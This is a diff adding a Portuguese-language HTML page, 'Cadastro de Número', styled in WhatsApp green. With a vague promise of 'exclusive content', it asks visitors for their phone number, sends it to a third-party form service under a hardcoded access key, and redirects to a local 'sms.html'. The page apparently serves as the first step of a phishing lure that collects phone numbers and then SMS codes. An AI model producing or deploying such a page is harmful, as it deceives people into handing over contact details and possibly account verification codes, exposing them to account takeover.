@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📱 Cadastro de Número</title>
+
+    <meta property="og:title" content="📱 Cadastro de Número">
+    <meta property="og:description" content="Cadastre seu número de telefone para acessar o conteúdo exclusivo.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2mwe6bn7S1MHf0WtSPMMeUSGPhCyWlwp-Lg&usqp=CAU">
+    <meta property="og:url" content="file:///C:/Users/PC/Desktop/ctt/number">
+    <meta name="theme-color" content="#25D366">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: url('https://i.postimg.cc/0NzzVHcn/IMG-20250214-WA0000.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+            color: white;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(3px);
+            background: rgba(0, 0, 0, 0.2);
+            z-index: -1;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px rgba(0, 255, 0, 0.3);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        input[type="tel"] {
+            padding: 12px;
+            font-size: 18px;
+            width: 80%;
+            max-width: 350px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+        }
+
+        .button {
+            display: inline-block;
+            width: 80%;
+            max-width: 350px;
+            padding: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: white;
+            text-decoration: none;
+            text-align: center;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 10px 0;
+        }
+
+        .submit-btn {
+            background: #25D366;
+        }
+
+        .submit-btn:hover {
+            background: #1da851;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>📱 Cadastro de Número</h1>
+        <p>Para continuar, por favor, insira seu número de telefone.</p>
+
+        <!-- Formulário de cadastro de telefone -->
+        <form action="https://api.staticforms.xyz/submit" method="post">
+            <!-- Replace with accessKey sent to your email -->
+            <input type="hidden" name="accessKey" value="7720d858-2ddb-4875-963b-9c3e1458443b"> <!-- Required -->
+            <input type="tel" name="phone" placeholder="Digite seu número de telefone" required> <!-- Only phone input -->
+            <input type="hidden" name="honeypot" style="display: none;"> <!-- Hidden field to prevent spam -->
+            <input type="hidden" name="redirectTo" value="file:///C:/Users/PC/Desktop/ctt/sms.html"> <!-- Redirection URL -->
+            <input type="submit" value="Enviar Número" class="button submit-btn">
+        </form>
+    </div>
+
+</body>
+</html>
